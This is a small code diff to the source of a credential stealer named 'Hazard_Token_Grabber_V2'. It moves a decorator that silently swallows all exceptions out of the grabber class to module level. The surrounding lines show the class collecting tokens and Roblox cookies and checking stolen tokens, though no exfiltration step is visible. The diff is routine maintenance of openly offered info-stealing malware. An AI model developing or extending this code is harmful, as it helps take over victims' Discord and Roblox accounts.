@@ -68,6 +68,13 @@ class functions(object):
     def config(e: str):
         return config.get(e)
 
+def try_extract(func):
+    def wrapper(*args, **kwargs):
+        try:
+            func(*args, **kwargs)
+        except Exception:
+            pass
+    return wrapper
 
 class Hazard_Token_Grabber_V2(functions):
     def __init__(self):
@@ -88,15 +95,6 @@ class Hazard_Token_Grabber_V2(functions):
         self.sep = os.sep
         self.tokens = []
         self.robloxcookies = []
-
-    @staticmethod
-    def try_extract(func):
-        def wrapper(*args, **kwargs):
-            try:
-                func(*args, **kwargs)
-            except Exception:
-                pass
-        return wrapper
 
     async def checkToken(self, tkn: str) -> str:
         try:
